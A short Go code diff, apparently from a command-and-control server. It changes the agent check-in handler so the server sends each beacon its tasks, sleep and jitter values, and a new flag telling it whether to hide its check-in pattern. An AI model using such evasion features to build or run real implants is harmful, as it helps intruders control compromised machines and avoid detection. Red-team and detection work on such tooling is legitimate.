@@ -84,7 +84,7 @@ func (l *AgentLink) Closed() bool { return l.closed }
 
 func (l *AgentLink) onCheckin(msg map[string]any) ([][]byte, error) {
 	tasks := l.Hub.NextTasks(l.AgentID, MaxTasksPerCycle)
-	sleep, jitter := l.Hub.Policy(l.AgentID)
+	sleep, jitter, obfuscate := l.Hub.PolicyFull(l.AgentID)
 
 	encoded := make([]any, 0, len(tasks))
 	for _, t := range tasks {
@@ -98,6 +98,9 @@ func (l *AgentLink) onCheckin(msg map[string]any) ([][]byte, error) {
 		"tasks":       encoded,
 		"sleep":       sleep,
 		"jitter":      jitter,
+		// The obfuscation flag travels with the cadence: the server decides
+		// whether the beacon hides its check-in pattern.
+		"obf":         obfuscate,
 		"server_time": time.Now().Unix(),
 	}
 	if n, ok := number(msg["n"]); ok {
